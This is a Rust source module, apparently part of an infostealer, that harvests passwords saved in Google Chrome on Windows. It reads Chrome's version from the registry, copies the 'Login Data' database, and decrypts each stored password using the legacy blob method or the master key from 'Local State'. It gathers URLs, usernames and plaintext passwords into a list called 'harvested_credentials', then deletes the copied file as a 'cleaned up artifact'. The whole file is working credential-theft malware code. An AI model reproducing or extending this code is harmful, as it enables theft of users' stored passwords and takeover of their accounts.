use crate::utilities::{
    Registry,
    Utils,
};

use crate::passwords::browsers::chromium::{
    decrypt_chromium_password, 
    decrypt_chromium_blob, 
    get_master_key
};

use anyhow::{
    anyhow, 
    Result
};

use std::path::Path;

pub struct Chrome;

impl Chrome {
    pub fn grab() -> Vec<String> {
        if let Ok(version) = get_chrome_version() {
            if let Ok(credentials) = get_chrome_credentials(version) {
                return credentials;
            }
        }
        return vec![];
    }
}

fn get_chrome_version() -> Result<i32> {
    //Determine the version that chrome is installed with.
    if let Ok(chrome_version_string) = Registry::get_registry_value(Registry::current_user(), "Software\\Google\\Chrome\\BLBeacon", "version") {
        let split: Vec<&str> = chrome_version_string.split(".").collect();
        if split.len() > 1 {
            match split[0].parse::<i32>() {
                Ok(converted) => return Ok(converted),
                Err(e) => return Err(anyhow!(format!("{}", e))),
            };
        }
    }
    Err(anyhow!("Chrome not installed"))
}

fn get_chrome_credentials(version: i32) -> Result<Vec<String>> {
    let mut harvested_credentials: Vec<String> = vec![];
    let chrome_db_src = Utils::construct_directory(get_login_data_src().as_str());

    if Path::new(&chrome_db_src).exists() {
        let chrome_db_dst = Utils::construct_directory(get_login_data_dst().as_str());
        if Utils::copy_file(&chrome_db_src, &chrome_db_dst) {
            if let Ok(conn) = sqlite::open(&chrome_db_dst) {

            let mut cursor = conn.prepare("SELECT password_value, signon_realm, username_value FROM \"logins\"")?.cursor();
                while let Some(row) = cursor.next().expect("cursor failed") {
                    if let Ok(buffer) = row[0].as_binary().ok_or(vec![0]) {

                        let decrypted_password = match version {
                            0i32..=81i32 => {
                                let decrypted_password = std::str::from_utf8(&decrypt_chromium_blob(&buffer.to_vec()))?.to_string();
                                decrypted_password
                            },
                            _ => {
                                let decrypted_password = decrypt_chromium_password(get_master_key(get_local_state().as_str())?,buffer.to_vec())?;
                                decrypted_password
                            },
                        };

                        let url = row[1].as_string().ok_or("failed to get url");
                        let username = row[2].as_string().ok_or("failed to get username");
                        
                        harvested_credentials.push(format!("URL: {}\nUSERNAME: {}\nPASSWORD: {}\n\n", url.unwrap(), username.unwrap(), decrypted_password));
                    }
                }
            }
            if Utils::remove_file(&chrome_db_dst) {
                println!("[+] Cleaned up artifact: {}\n\n", &chrome_db_dst);
            }
        }

    } else {
        return Err(anyhow!("Chrome not installed"));
    }

    Ok(harvested_credentials)
}

fn get_login_data_src() -> String {
    return "\\Appdata\\Local\\Google\\Chrome\\User Data\\Default\\Login Data".to_string();
}

fn get_login_data_dst() -> String {
    return "\\Appdata\\Local\\database.chrome".to_string();
}

fn get_local_state() -> String {
    return "\\Appdata\\Local\\Google\\Chrome\\User Data\\Local State".to_string();
}
